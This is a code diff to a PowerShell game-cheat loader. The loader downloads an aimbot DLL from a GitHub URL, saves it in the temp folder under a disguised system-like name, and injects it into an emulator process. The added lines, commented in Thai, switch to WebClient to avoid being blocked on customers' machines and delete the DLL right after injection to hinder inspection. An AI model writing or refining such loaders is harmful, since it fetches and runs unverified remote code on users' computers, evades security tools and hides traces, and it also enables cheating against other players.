@@ -43,15 +43,18 @@ function Show-Auth {
 }
 
 if (Show-Auth) {
+    # ตรวจสอบชื่อไฟล์ให้ตรงกับ GitHub
     $dllUrl = "https://raw.githubusercontent.com/relaxhaha56-maker/node-storage-33/refs/heads/main/AimbotFemaleFix.dll"
     $tempPath = "$env:TEMP\sys_node_cache.dll"
     $targetProc = "HD-Player"
 
     Write-Host "[*] Syncing data with node-storage..." -ForegroundColor Yellow
     try {
-        Invoke-WebRequest -Uri $dllUrl -OutFile $tempPath -ErrorAction Stop
+        # เปลี่ยนมาใช้ WebClient เพื่อลดโอกาสโดนบล็อกในเครื่องลูกค้า
+        $webClient = New-Object System.Net.WebClient
+        $webClient.DownloadFile($dllUrl, $tempPath)
     } catch {
-        Write-Host "[!] Failed to download DLL." -ForegroundColor Red
+        Write-Host "[!] Failed to download DLL: $($_.Exception.Message)" -ForegroundColor Red
         exit
     }
 
@@ -82,6 +85,7 @@ if (Show-Auth) {
     Add-Type -TypeDefinition $Source
     [NodeHandler]::StartNode($tempPath, $targetProc)
     Write-Host "[+] Injection Completed. Aimbot Active." -ForegroundColor Green
+    # ลบไฟล์ชั่วคราวทิ้งทันทีเพื่อป้องกันการตรวจสอบ
     Remove-Item $tempPath -Force -ErrorAction SilentlyContinue
 } else {
     Write-Host "Closing in 3 seconds..."
